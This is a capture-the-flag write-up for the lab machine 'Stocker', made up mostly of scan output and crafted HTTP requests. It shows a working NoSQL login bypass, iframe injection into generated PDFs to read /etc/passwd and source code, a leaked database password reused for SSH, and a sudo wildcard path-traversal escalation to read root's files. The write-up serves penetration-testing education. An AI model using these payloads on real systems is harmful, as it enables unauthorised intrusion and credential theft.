# Stocker

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.121.212
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 19:03 GMT
Nmap scan report for 10.129.121.212
Host is up (0.065s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp   open     http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=1/14%OT=22%CT=1%CU=37525%PV=Y%DS=2%DC=T%G=Y%TM=63C2FCA
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O
OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   67.67 ms 10.10.14.1
2   67.73 ms 10.129.121.212

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.36 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.121.212
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 19:05 GMT
Warning: 10.129.121.212 giving up on port because retransmission cap hit (6).
Nmap scan report for stocker.htb (10.129.121.212)
Host is up (0.063s latency).
Not shown: 65468 closed tcp ports (reset), 65 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
|_http-generator: Eleventy v2.0.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=1/14%OT=22%CT=1%CU=34169%PV=Y%DS=2%DC=T%G=Y%TM=63C3025
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(TI=Z
OS:%CI=Z%TS=B)SEQ(TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II
OS:=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7
OS:%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%
OS:W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   63.18 ms 10.10.14.1
2   62.74 ms stocker.htb (10.129.121.212)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1364.42 seconds
```

```c
$ sudo nmap -sV -sU 10.129.121.212
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 19:30 GMT
Nmap scan report for stocker.htb (10.129.121.212)
Host is up (0.066s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1387.29 seconds
```

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.121.212  stocker.htb
```

## Enumeration of 80/TCP

> http://stocker.htb/

```c
$ whatweb http://stocker.htb 
http://stocker.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.121.212], Meta-Author[Holger Koenemann], MetaGenerator[Eleventy v2.0.0], Script, Title[Stock - Coming Soon!], nginx[1.18.0]
```

## Subdomain Enumeration with ffuf

```c
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.stocker.htb" -u http://stocker.htb --fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 77ms]
:: Progress: [114441/114441] :: Job [1/1] :: 412 req/sec :: Duration: [0:04:53] :: Errors: 0 ::
```

```c
$ cat /etc/hosts    
127.0.0.1       localhost
127.0.1.1       kali
10.129.121.212  stocker.htb
10.129.121.212  dev.stocker.htb
```

## Enumeration of dev.stocker.htb

> http://dev.stocker.htb

```c
$ whatweb http://dev.stocker.htb
http://dev.stocker.htb [302 Found] Cookies[connect.sid], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.129.121.212], RedirectLocation[/login], X-Powered-By[Express], nginx[1.18.0]
http://dev.stocker.htb/login [200 OK] Bootstrap, Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.129.121.212], Meta-Author[Mark Otto, Jacob Thornton, and Bootstrap contributors], MetaGenerator[Hugo 0.84.0], PasswordField[password], Script, Title[Stockers Sign-in], X-Powered-By[Express], nginx[1.18.0]
```

| User |
| --- |
| Angoose Garden |

## Directory Busting with Gobuster

```c
$ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://dev.stocker.htb
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.stocker.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/14 19:06:11 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2667]
/static               (Status: 301) [Size: 179] [--> /static/]
/logout               (Status: 302) [Size: 28] [--> /login]
/stock                (Status: 302) [Size: 48] [--> /login?error=auth-required]
Progress: 51663 / 207644 (24.88%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/01/14 19:14:11 Finished
===============================================================
```

## Express-Js NoSQL Authentication Bypass

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

Modified Request:

```c
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 55
Origin: http://dev.stocker.htb
DNT: 1
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AQcjX-VYzARtzf_hP6JLaw3gbcjx8BVsM.oe2qgfHpMA42LG3wazk91dL05PdHWR7qeEfOW%2Fvu7XU
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

{"username": {"$ne": null}, "password": {"$ne": null} }
```

> http://dev.stocker.htb/stock

## Another Subdomain

I played around in the shop and had a look at the requests.

Request:

```c
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 162
DNT: 1
Connection: close
Cookie: connect.sid=s%3AQcjX-VYzARtzf_hP6JLaw3gbcjx8BVsM.oe2qgfHpMA42LG3wazk91dL05PdHWR7qeEfOW%2Fvu7XU
Sec-GPC: 1

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

I "purchased" an article and downloaded the receiped.

```c

Thank you for your purchase!

Order ID: 63c3037baa3b49f3f6a3d2d8

Your order details have been emailed to you. You can view the purchase order here.

```

> http://dev.stocker.htb/api/po/63c3037baa3b49f3f6a3d2d8

```c
[...]
Contact support@stock.htb for any support queries.
```

## Cross-Site Scripting (XSS) to Local File Inclusion (LFI)

Modified Request:

```c
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 334
DNT: 1
Connection: close
Cookie: connect.sid=s%3AQcjX-VYzARtzf_hP6JLaw3gbcjx8BVsM.oe2qgfHpMA42LG3wazk91dL05PdHWR7qeEfOW%2Fvu7XU
Sec-GPC: 1

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a93","title":"<iframe src='/etc/passwd'/>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}
```

Then I downloaded the receiped as before and got the output of `/etc/passwd`.

Modified Request:

```c
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 334
DNT: 1
Connection: close
Cookie: connect.sid=s%3AQcjX-VYzARtzf_hP6JLaw3gbcjx8BVsM.oe2qgfHpMA42LG3wazk91dL05PdHWR7qeEfOW%2Fvu7XU
Sec-GPC: 1

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1},{"_id":"638f116eeb060210cbd83a93","title":"<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":2}]}
```

```c
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

| Username |
| --- |
| angoose |

## Foothold

Modified Request:

```c
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 162
DNT: 1
Connection: close
Cookie: connect.sid=s%3AQcjX-VYzARtzf_hP6JLaw3gbcjx8BVsM.oe2qgfHpMA42LG3wazk91dL05PdHWR7qeEfOW%2Fvu7XU
Sec-GPC: 1

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=file:///var/www/dev/index.js height=1000px width=1000px></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

Credentials:

```c
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString("hex"),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
[...]
```

| Username | Password |
| --- | --- |
| angoose | IHeardPassphrasesArePrettySecure |

```c
$ ssh angoose@stocker.htb
The authenticity of host 'stocker.htb (10.129.121.212)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'stocker.htb' (ED25519) to the list of known hosts.
angoose@stocker.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$
```

## user.txt

```c
angoose@stocker:~$ cat user.txt
71988e503787aea9340095835a9019b9
```

## Enumeration

```c
angoose@stocker:~$ id
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
```

```c
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

```c
angoose@stocker:/usr/local/scripts$ ls -la
total 32
drwxr-xr-x  3 root root 4096 Dec  6 10:33 .
drwxr-xr-x 11 root root 4096 Dec  6 10:33 ..
-rwxr-x--x  1 root root  245 Dec  6 09:53 creds.js
-rwxr-x--x  1 root root 1625 Dec  6 09:53 findAllOrders.js
-rwxr-x--x  1 root root  793 Dec  6 09:53 findUnshippedOrders.js
drwxr-xr-x  2 root root 4096 Dec  6 10:33 node_modules
-rwxr-x--x  1 root root 1337 Dec  6 09:53 profitThisMonth.js
-rwxr-x--x  1 root root  623 Dec  6 09:53 schema.js
```

Malicious JavaScript File:

root.js:

```c
const fs = require('fs');

fs.readFile('/root/root.txt', 'utf8', (err, data) => {
  if (err) throw err;
  console.log(data);
});
```

## root.txt

```c
angoose@stocker:/dev/shm$ sudo /usr/bin/node /usr/local/scripts/../../../dev/shm/*.js
eccb4cacccb2cf86ad3427c643012b01
```
